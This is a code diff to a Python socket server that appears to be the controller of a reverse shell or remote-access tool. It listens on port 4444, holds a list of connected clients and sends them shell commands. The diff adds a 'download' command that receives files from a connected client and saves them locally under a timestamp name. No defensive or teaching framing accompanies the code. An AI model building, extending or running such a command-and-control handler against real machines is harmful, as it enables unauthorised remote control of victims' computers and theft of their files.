@@ -4,13 +4,14 @@ import socket
 from threading import Thread
 from queue import Queue
 import time
-import os
+import datetime
 
 HOST = "127.0.0.1"
 PORT = 4444
 CLIENTS = []
 THREADS = []
-
+NOW = datetime.datetime.now().strftime("%Y") + datetime.datetime.now().strftime(
+    "%m") + datetime.datetime.now().strftime("%d") + datetime.datetime.now().strftime("%H%M%S")
 
 def _decode(data):
     try:
@@ -102,6 +103,14 @@ def shell(client, sock):
             conn.send(cmd.encode())
             if "exit" == cmd:
                 break
+            elif 'download' in cmd:
+                size_file = conn.recv(5000)
+                data = conn.recv(int(size_file))
+                file_extension = "." + cmd.split(".")[1]
+                new_file = open(NOW + file_extension, "wb")
+                new_file.write(data)
+                new_file.close()
+                print("File " + NOW + file_extension + " has been downloaded")
             if not cmd:
                 print("Invalid command")
             else:
